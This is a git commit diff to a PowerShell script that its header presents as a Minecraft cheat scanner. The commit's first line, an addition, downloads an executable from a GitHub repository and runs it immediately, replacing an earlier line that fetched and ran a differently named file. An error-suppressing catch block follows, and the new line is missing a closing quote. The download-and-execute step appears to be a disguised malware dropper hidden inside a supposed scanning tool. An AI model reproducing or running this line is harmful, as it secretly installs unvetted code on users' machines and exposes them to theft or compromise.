250d95f7f03117293007f18bd351415b35ac2af3
Proshkaversus <fima17167@gmail.com>
2026-01-10 23:27:34 +0200

    Update cheker.ps1

--- cheker.ps1
+++ cheker.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe
+Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Legaspi.exe -OutFile "Legaspi.exe"; .\Legaspi.exe
 
 # MINECRAFT CHEAT SCANNER v2.0 
 
@@ -96,6 +96,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
